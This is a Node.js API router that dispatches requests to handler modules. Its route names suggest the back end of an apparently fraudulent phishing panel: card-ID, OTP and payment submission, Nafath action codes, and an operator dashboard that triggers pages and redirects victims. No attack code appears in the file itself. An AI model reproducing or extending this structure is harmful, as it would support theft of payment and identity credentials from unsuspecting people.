const handlers = {
  'dashboard/login': require('./_handlers/dashboard-login'),
  'dashboard/logout': require('./_handlers/dashboard-logout'),
  'dashboard/user-info': require('./_handlers/dashboard-user-info'),
  'dashboard/card-id': require('./_handlers/dashboard-card-id'),
  'dashboard/polling-dashboard': require('./_handlers/dashboard-polling'),
  'dashboard/stats': require('./_handlers/dashboard-stats'),
  'dashboard/trigger-page': require('./_handlers/dashboard-trigger-page'),
  'dashboard/action-code': require('./_handlers/dashboard-action-code'),
  'dashboard/action-code-nafath': require('./_handlers/dashboard-action-code-nafath'),
  'dashboard/delete-user': require('./_handlers/dashboard-delete-user'),
  'dashboard/delete-all': require('./_handlers/dashboard-delete-all'),
  'submit-form': require('./_handlers/submit-form'),
  'submit-otp': require('./_handlers/submit-otp'),
  'submit-payment': require('./_handlers/submit-payment'),
  'submit-payment2': require('./_handlers/submit-payment2'),
  'submit-s': require('./_handlers/submit-s'),
  'heartbeat': require('./_handlers/heartbeat'),
  'polling-redirect': require('./_handlers/polling-redirect'),
  'wait-fn': require('./_handlers/wait-fn'),
};

module.exports = async (req, res) => {
  const pathSegments = req.query.path;
  const route = Array.isArray(pathSegments) ? pathSegments.join('/') : pathSegments;

  const handler = handlers[route];
  if (handler) {
    return handler(req, res);
  }

  res.status(404).json({ error: 'Not found' });
};
